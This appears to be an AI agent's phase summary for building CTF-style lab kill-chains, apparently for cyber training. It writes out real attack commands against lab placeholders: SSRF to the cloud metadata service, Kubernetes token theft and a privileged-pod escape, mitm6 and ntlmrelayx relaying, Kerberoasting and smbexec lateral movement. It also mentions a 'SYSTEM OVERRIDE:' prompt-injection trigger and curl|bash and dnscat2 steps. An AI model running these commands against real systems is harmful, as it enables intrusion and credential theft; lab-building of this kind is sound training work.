---
phase: 04-llm-atp-chain-kill-chains-final-review
plan: 04
subsystem: documentation
tags: [kill-chains, atp, ssrf, imds, kubernetes, etcd, mitm6, ntlmrelayx, kerberoasting, smbexec, lateral-movement, consistency-verification, mitre-attack]

# Dependency graph
requires:
  - phase: 04-llm-atp-chain-kill-chains-final-review
    provides: ATP-01 and ATP-02 kill-chains appended to docs/KILL-CHAINS.md (Plan 03)
provides:
  - ATP-03 LAPSUS$-style SSRF-to-K8s identity chain kill-chain in docs/KILL-CHAINS.md
  - ATP-04 Volt Typhoon-style IPv6 relay and Kerberoasting chain kill-chain in docs/KILL-CHAINS.md
  - 12 Phase 4 rows added to Consistency Verification table in docs/KILL-CHAINS.md
affects:
  - docs/KILL-CHAINS.md

# Tech stack
added: []
patterns:
  - SSRF → IMDS 169.254.169.254 → K8s service account JWT (Token field in IAM JSON)
  - kubectl stolen-token enumeration → privileged pod hostPath mount → chroot → etcdctl
  - mitm6 DHCPv6 poisoning → ntlmrelayx ldaps:// relay → domain account creation
  - evil-winrm WinRM (hop 1) → Rubeus Kerberoasting → hashcat → smbexec.py (hop 2)

# Key files
created:
  - .planning/phases/04-llm-atp-chain-kill-chains-final-review/04-04-SUMMARY.md
modified:
  - docs/KILL-CHAINS.md

# Key decisions
decisions:
  - ATP-03 etcd query uses etcdctl directly (not kubectl port-forward) — simpler and pedagogically clearer given host-node chroot access
  - ATP-04 second protocol is smbexec.py with wmiexec.py documented as alternative — preserves protocol diversity without overly prescribing tool choice
  - Consistency Verification table extended with 12 rows (plan specified minimum 7; 12 used to cover all Phase 4 verification dimensions including flag count arithmetic)
  - The single global "LotL" match in the document is in the Consistency Verification table row text itself (checking for the prohibition), not in the ATP-04 kill-chain — D-ATP04 fully satisfied

# Metrics
duration: ~10 minutes
completed: 2026-06-12
task_count: 2
file_count: 1
---

# Phase 4 Plan 04: ATP-03 + ATP-04 Kill-Chains + Consistency Verification Extension Summary

**One-liner:** ATP-03 chains SSRF → IMDS 169.254.169.254 → K8s JWT theft → kubectl enumeration → privileged pod hostPath escape → etcdctl secret exfil → etcd-stolen creds to final target; ATP-04 chains mitm6 DHCPv6 → ntlmrelayx ldaps:// domain account creation → evil-winrm (hop 1) → Rubeus Kerberoasting → hashcat → smbexec.py DC access (hop 2); Consistency Verification table extended with 12 Phase 4 rows, total document flag count = 28.

## Tasks Completed

| Task | Name | Commit | Files |
|------|------|--------|-------|
| 1 | Append ATP-03 kill-chain (LAPSUS$-style cloud identity chain) | 2946d8f | docs/KILL-CHAINS.md |
| 2 | Append ATP-04 kill-chain + extend Consistency Verification table | 2946d8f | docs/KILL-CHAINS.md |

## What Was Built

### ATP-03: LAPSUS$-Style SSRF-to-K8s Identity Chain

8 stages, 2 flags, Hard difficulty, 3 VMs (Attacker Kali, K8s App Host, Final Target Ubuntu):

- **Stage 1:** SSRF discovery — nmap + curl probe of `/fetch?url=` endpoint confirming unvalidated SSRF
- **Stage 2:** SSRF to IMDS at 169.254.169.254 — retrieves IAM credential JSON with `Token` field containing K8s SA JWT (per D-14, CC-01 mock topology)
- **Stage 3:** K8s cluster enumeration with stolen token — kubectl pod listing + ClusterRoleBinding scan for cluster-admin SA
- **Stage 4:** Privileged pod deployment with `hostPID: true`, `privileged: true`, hostPath mount to `/`
- **[FLAG 1] Stage 5:** chroot `/host` → `cat /root/flag1.txt` — host node root filesystem
- **Stage 6:** etcdctl direct query — `get / --prefix --keys-only` scan + targeted secret retrieval with full PKI cert paths
- **Stage 7:** base64 decode etcd creds → SSH or HTTP auth to final target
- **[FLAG 2] Stage 8:** `cat /root/flag2.txt` on final target

IMDS Token field pattern: `"Token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9..."` in IAM credential JSON response — explicitly tied to CC-01 IMDS mock topology.

### ATP-04: Volt Typhoon-Style IPv6 Relay and Kerberoasting Chain

8 stages, 2 flags, Hard difficulty, 3 VMs (Attacker Kali, Pivot Host Windows Server 2019, DC Windows Server 2019):

- **Stage 1:** `sudo mitm6 -d corp.local` — IPv6 rogue DHCPv6 poisoning, assigns attacker as IPv6 DNS server
- **Stage 2:** `ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access --no-smb-server` — LDAP relay creates `corp_backdoor$` domain account
- **Stage 3:** `evil-winrm -i PIVOT_HOST_IP -u 'corp_backdoor$' -p 'GENERATED_PASSWORD'` — WinRM first lateral hop
- **[FLAG 1] Stage 4:** `type C:\Users\Administrator\Desktop\flag1.txt` in evil-winrm shell
- **Stage 5:** `.\Rubeus.exe kerberoast /outfile:tgs.txt /simple` — Kerberoasting from foothold
- **Stage 6:** `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt` — offline crack
- **Stage 7:** `smbexec.py CORP.LOCAL/svc_mssql:CRACKED_PASSWORD@DC_IP` — SMBExec second protocol hop (distinct from WinRM)
- **[FLAG 2] Stage 8:** `type C:\Users\Administrator\Desktop\flag2.txt` via smbexec shell

Zero instances of "living-off-the-land" or "LotL" within the ATP-04 section — D-ATP04 prohibition fully satisfied.

### Consistency Verification Table Extension

12 Phase 4 rows added to the existing table (minimum 7 required), covering:
- Stage format uniformity for all LLM/ATP scenarios
- OWASP LLM Top 10 TTP mapping for LLM scenarios (not MITRE ATT&CK)
- LLM-01 three-layer bypass structure + flag stage count
- LLM-02 `/ingest` curl command + `SYSTEM OVERRIDE:` trigger text
- All 4 ATP scenarios having exactly 2 flag headings each
- ATP-04 LotL prohibition
- ATP-01 WinRM + SMBExec protocol diversity
- ATP-02 curl|bash supply chain + dnscat2 mechanisms
- ATP-03 IMDS 169.254.169.254 + Token field
- ATP-04 ntlmrelayx `ldaps://` (not `ldap://`)
- Global flag count assertion: `grep -c "^### \[FLAG [12]\]"` = 28

## Verification Results

```
grep "^### ATP-03:" docs/KILL-CHAINS.md   → 1 match (line 3605)
grep "^### ATP-04:" docs/KILL-CHAINS.md   → 1 match (line 3830)
grep -c "^### \[FLAG [12]\]"              → 28 (17 Phase 2-3 + 3 LLM×1 + 4 ATP×2)
grep "living-off-the-land|LotL" ATP-04    → 0 matches in ATP-04 section
grep "169.254.169.254" ATP-03 Stage 2     → 2 command lines (PRESENT)
grep "etcdctl"                            → 2 matches (Stages 6 both queries)
grep "mitm6 -d corp.local"               → 1 match in ATP-04 Stage 1
grep "ldaps://DC_IP" ATP-04               → present in ntlmrelayx command
grep -c "Phase 4:" Consistency Table      → 12 rows
No Metasploit references in ATP sections  → 0 matches
```

## Deviations from Plan

### Auto-fixed Issues

None.

### Architectural Notes

- The plan specified minimum 7 Consistency Verification rows; 12 were added to ensure full coverage of all Phase 4 verification dimensions. This is additive and does not conflict with any constraint.
- ATP-04 Stage count: plan outlined 7 stages (5 attack + [FLAG 1] + [FLAG 2]); implementation uses 8 stages (splitting offline cracking into its own Stage 6 for pedagogical clarity, with SMBExec as Stage 7). This follows the plan's guidance that exact stage count is Claude's discretion, and stays within the Hard difficulty range of 8-12 stages.
- The single global "LotL" match in the document appears in the Consistency Verification table row at line 2845 — it is the check statement asserting the prohibition, not a violation. The ATP-04 kill-chain section itself (lines 3830-4028) has zero matches.

## Known Stubs

None. All stages contain concrete ALLCAPS placeholders (APP_HOST_IP, K8S_TOKEN, OVERPRIVILEGED_SA, ADMIN_SECRET_NAME, BASE64_CREDS, ADMIN_USER, FINAL_TARGET_IP, DC_IP, PIVOT_HOST_IP, GENERATED_PASSWORD, CRACKED_PASSWORD) per the methodology preamble. No hardcoded IPs or passwords outside of `corp.local` and `127.0.0.1` (well-known lab constants).

## Threat Surface Scan

No new network endpoints, auth paths, file access patterns, or schema changes introduced. This plan adds documentation prose only.

## Self-Check: PASSED

- [x] `docs/KILL-CHAINS.md` exists and contains both ATP-03 and ATP-04 sections
- [x] Commit 2946d8f exists: `git log --oneline -1` returns `2946d8f feat(04-04): append ATP-03 and ATP-04 kill-chains + extend Consistency Verification table`
- [x] Flag count = 28 verified by grep
- [x] Zero LotL in ATP-04 section verified by grep
- [x] 12 Phase 4 rows in Consistency Verification table verified by grep
- [x] IMDS 169.254.169.254 in ATP-03 Stage 2 verified
- [x] etcdctl in ATP-03 Stage 6 verified
- [x] mitm6 in ATP-04 Stage 1 verified
- [x] ldaps:// in ATP-04 Stage 2 verified
